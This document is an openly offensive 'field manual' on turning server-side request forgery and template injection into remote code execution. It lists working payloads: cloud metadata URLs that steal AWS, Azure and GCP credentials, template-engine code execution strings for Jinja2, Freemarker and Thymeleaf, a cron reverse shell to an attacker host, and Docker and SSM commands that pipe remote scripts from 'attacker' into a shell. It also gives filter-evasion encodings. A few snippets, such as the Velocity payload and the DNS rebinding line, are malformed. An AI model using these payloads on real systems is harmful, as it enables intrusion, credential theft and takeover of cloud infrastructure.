# Offensive Security RCE Field Manual — Part 2
## SSRF → RCE & Template Injection (SSTI) — 2025 Edition
*A comprehensive offensive security guide covering Server-Side Request Forgery (SSRF) exploitation, pivoting to internal RCE, cloud metadata abuse, modern template injection (SSTI), and real-world exploitation chains used by adversaries in 2025.*

---

# Table of Contents

1. [Introduction](#introduction)  
   - [1.1 Why SSRF and SSTI Matter in 2025](#11-why-ssrf-and-ssti-matter-in-2025)  
   - [1.2 Modern SSRF & Template Injection Threat Landscape](#12-modern-ssrf--template-injection-threat-landscape)

2. [SSRF (Server-Side Request Forgery)](#2-ssrf)  
   - [2.1 What SSRF Is and Why It Is Dangerous](#21-what-ssrf-is-and-why-it-is-dangerous)  
   - [2.2 How SSRF Becomes RCE](#22-how-ssrf-becomes-rce)  
   - [2.3 Common SSRF Attack Surfaces](#23-common-ssrf-attack-surfaces)  
   - [2.4 SSRF Payloads](#24-ssrf-payloads)  
   - [2.5 Real-World SSRF → RCE Chains](#25-real-world-ssrf--rce-chains)

3. [Cloud Metadata SSRF Exploitation](#3-cloud-metadata-ssrf-exploitation)  
   - [3.1 AWS Metadata RCE Exploitation](#31-aws-metadata-rce-exploitation)  
   - [3.2 Azure Metadata RCE Exploitation](#32-azure-metadata-rce-exploitation)  
   - [3.3 GCP Metadata SSRF Execution](#33-gcp-metadata-ssrf-execution)

4. [Template Injection (SSTI)](#4-template-injection-ssti)  
   - [4.1 What Template Injection Is](#41-what-template-injection-is)  
   - [4.2 How SSTI Leads to RCE](#42-how-ssti-leads-to-rce)  
   - [4.3 Identifying Template Engines](#43-identifying-template-engines)  
   - [4.4 Payload Examples (Multiple Engines)](#44-payload-examples-multiple-engines)  
   - [4.5 Real-World SSTI → RCE Chains](#45-real-world-ssti--rce-chains)

5. [Abusing Internal Services](#5-abusing-internal-services)  
   - [5.1 Redis → RCE](#51-redis--rce)  
   - [5.2 Memcached → RCE](#52-memcached--rce)  
   - [5.3 Docker API → RCE](#53-docker-api--rce)  
   - [5.4 Jenkins Script Console → RCE](#54-jenkins-script-console--rce)

6. [WAF & SSRF Evasion Techniques](#6-waf--ssrf-evasion-techniques)

7. [Conclusion](#conclusion)

---

# Introduction

Server-Side Request Forgery (SSRF) and Server-Side Template Injection (SSTI) form the backbone of many modern RCE chains.  
In 2025, these two vectors remain essential for:

- breaking cloud isolation  
- pivoting into internal networks  
- compromising metadata services  
- achieving RCE inside cloud workloads  
- bypassing WAFs and network segmentation  
- exploiting microservices behind API gateways  

SSRF and SSTI are often misclassified as “medium severity,” yet advanced adversaries routinely use them as **stage-one primitives** for full compromise.

This section explains **how SSRF and SSTI achieve RCE**, how attackers weaponize them, and how these attack chains appear in real-world incidents.

---

# 1.1 Why SSRF and SSTI Matter in 2025

Modern infrastructures rely heavily on:

- metadata APIs  
- internal admin panels  
- internal API microservices  
- cloud management endpoints  
- templating engines embedded in user interfaces  
- YAML/JSON-to-template conversion  
- serverless and container environments  

These environments **implicitly trust internal traffic**.

SSRF allows attackers to impersonate internal traffic.  
SSTI allows attackers to influence internal command execution.

Together, they form one of the most reliable RCE chains available today.

---

# 1.2 Modern SSRF & Template Injection Threat Landscape

SSRF has become dramatically more dangerous due to:

- dependency on metadata services  
- serverless functions using runtime tokens  
- internal-only API endpoints  
- k8s cluster APIs listening on localhost  
- cloud-native CI/CD workflows  
- microservices trusting each other's requests  
- misconfigured reverse proxies  
- HTTP/2 smuggling interactions  

SSTI has grown due to:

- widespread use of template engines  
- dynamic rendering of JSON/XML data  
- merging user input into view contexts  
- email templating systems  
- PDF generation engines  
- microservice sidecar patterns  

Both vulnerability types are ubiquitous and frequently lead to RCE.

---

# 2. SSRF

# 2.1 What SSRF Is and Why It Is Dangerous

SSRF = **Server-Side Request Forgery**.  
It occurs when an attacker forces a backend server to send HTTP requests to arbitrary destinations.

### Why It Is Dangerous
- backend can reach internal networks  
- backend runs with privileged IAM roles  
- backend metadata access → theft of credentials  
- backend can access management interfaces  
- backend can send requests to internal RCE endpoints  
- backend may support dangerous protocols (gopher, file, ftp)

SSRF turns the server into a **proxy controlled by the attacker**.

---

# 2.2 How SSRF Becomes RCE

SSRF → RCE typically follows these chains:

### **Chain 1: SSRF → Cloud Metadata → Access Tokens → RCE**
1. SSRF hits metadata endpoint  
2. Credentials/keys retrieved  
3. Attacker uses them to run code in cloud service  

### **Chain 2: SSRF → Service Discovery → Internal Admin Panel → RCE**
Attacker uses SSRF to access:
- Jenkins script console  
- Docker API  
- Redis  
- Consul  
- Kubernetes API server  
- JMX endpoints  

### **Chain 3: SSRF → Internal API Command Execution**
Some internal APIs accept OS commands for automation.

---

# 2.3 Common SSRF Attack Surfaces

- **URL validators**  
- **image fetchers**  
- **PDF generators**  
- **RSS/ATOM fetchers**  
- **OAuth callback URLs**  
- **webhooks**  
- **“Check connection” admin tools**  
- **URL preview or metadata scrapers**  

Attackers often find SSRF in functionality like:

```
?url=http://example.com/feed.xml
```

or:

```
POST /api/fetch
{
  "url": "http://..."
}
```

---

# 2.4 SSRF Payloads

### Simple Internal Scan
```
http://127.0.0.1:80
```

### Scan AWS Metadata
```
http://169.254.169.254/latest/meta-data/
```

### Gopher Protocol RCE via Redis
```
gopher://127.0.0.1:6379/_FLUSHALL
```

### Bypass URL filters using DNS rebinding
```
http://internal.example.com. attackercontrolleddomain.com
```

### DNS exfiltration
```
http://attacker.com/?data=$(whoami)
```

---

# 2.5 Real-World SSRF → RCE Chains

### Example (2025 CI/CD Incident)
1. SSRF via webhook testing endpoint  
2. Internal Jenkins reachable  
3. Jenkins Script Console executed attacker Java payload  
4. RCE → lateral movement → secrets theft  

### Example (2025 Cloud Ransomware Incident)
1. SSRF in image renderer  
2. AWS metadata token extracted  
3. Attacker gained EC2 instance privileges  
4. Used SSM:SendCommand to run commands on entire fleet  
5. Full takeover  

---

# 3. Cloud Metadata SSRF Exploitation

Cloud metadata services provide secrets, IAM tokens, and runtime configuration.

### Metadata Endpoints
- AWS: `169.254.169.254/latest/meta-data/`  
- Azure: `169.254.169.254/metadata/instance?api-version=2021-02-01`  
- GCP: `metadata.google.internal/computeMetadata/v1/...`

---

# 3.1 AWS Metadata RCE Exploitation

### Extract Credentials
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Retrieve IAM role credentials:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role
```

### Why It Leads to RCE
The attacker uses the IAM credentials to:

- upload Lambda function code  
- run SSM commands  
- create EC2 with user data scripts  

### Example: SSM Remote Command Execution

```
aws ssm send-command --document-name "AWS-RunShellScript" \
  --parameters commands=["curl attacker | sh"] \
  --targets "Key=instanceids,Values=i-abc123"
```

---

# 3.2 Azure Metadata RCE Exploitation

Azure metadata endpoint:
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Attack
Add required header:
```
Metadata: true
```

Extract access_token:
```
/metadata/identity/oauth2/token?resource=https://management.azure.com/
```

### Use Token For RCE
- deploy malicious Function App  
- execute command in Automation Accounts  
- run commands via Azure Run Command  

---

# 3.3 GCP Metadata SSRF Execution

Metadata path:
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Header:
```
Metadata-Flavor: Google
```

### Use Token To Achieve RCE
GCP tokens often allow:

- Cloud Run deployments  
- Cloud Function uploads  
- OS Login privilege escalation  

---

# 4. Template Injection (SSTI)

---

# 4.1 What Template Injection Is

SSTI occurs when attacker-controlled input is executed by:

- Jinja2  
- Thymeleaf  
- Freemarker  
- Velocity  
- Pebble  
- Twig  
- Smarty  
- ERB  

Templates can expose:
- expression language  
- runtime objects  
- dangerous methods  

---

# 4.2 How SSTI Leads to RCE

Many template engines allow arbitrary code execution, often via:

- expression evaluation  
- method invocation  
- runtime access  
- reflection  

Attackers use SSTI to escalate from template control to **OS-level RCE**.

---

# 4.3 Identifying Template Engines

### Detection payloads

```
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${T(java.lang.Runtime).getRuntime()}
```

---

# 4.4 Payload Examples (Multiple Engines)

### Freemarker
```
${"freemarker?"+(7*7)}
```

RCE:
```
${T(java.lang.Runtime).getRuntime().exec("calc.exe")}
```

### Thymeleaf
```
__${7*7}__
```

RCE:
```
__${T(java.lang.Runtime).getRuntime().exec('wget attacker')}__
```

### Jinja2 (Python)
Test:
```
{{7*7}}
```

RCE:
```
{{ self.__init__.__globals__['os'].popen('id').read() }}
```

### Velocity
```
#set($x=7*7)
```

RCE:
```
#set($e="id")
$e.exec("id")
```

---

# 4.5 Real-World SSTI → RCE Chains

### 2025 E-Commerce Platform Incident
1. Template engine used to generate invoices  
2. JSON user input merged into invoice context  
3. Attacker injected Jinja2 payload  
4. RCE → complete compromise of backend DB  

### 2025 Enterprise Email Template Incident
1. Email rendering used Freemarker  
2. Admin UI allowed custom variables  
3. Expression language evaluated attacker input  
4. RCE → lateral to Active Directory  

---

# 5. Abusing Internal Services

SSRF + SSTI frequently pivot into internal systems.

---

# 5.1 Redis → RCE

### Write cron job to spawn reverse shell:
```
* * * * * bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

Send via gopher SSRF.

---

# 5.2 Memcached → RCE

Abuse command injection in management UIs exposed internally.

---

# 5.3 Docker API → RCE

If Docker API exposed:

```
POST /containers/create
{
  "Image": "alpine",
  "Cmd": ["sh", "-c", "curl attacker | sh"]
}
```

---

# 5.4 Jenkins Script Console → RCE

```
println "cmd.exe /c calc.exe".execute().text
```

---

# 6. WAF & SSRF Evasion Techniques

Attackers bypass WAF and filters using:

### **Encoding**
```
http://127.0.0.1%25%32%35:80
```

### **DNS Rebinding**
Unique subdomains that rebind to an internal IP.

### **Protocol Smuggling**
```
gopher://
ftp://
file://
```

### **HTTP Request Splitting**
Used to bypass allowlists and input sanitation.

---

# Conclusion

SSRF and SSTI form two of the most powerful RCE vectors in modern offensive operations.  
Cloud adoption, microservices, template engines, and metadata services make these vulnerabilities exceptionally impactful in 2025.

Attackers combine SSRF → SSTI → Metadata → RCE to build multi-stage intrusion paths capable of compromising entire infrastructures from a single injection point.

---

# END OF PART 2
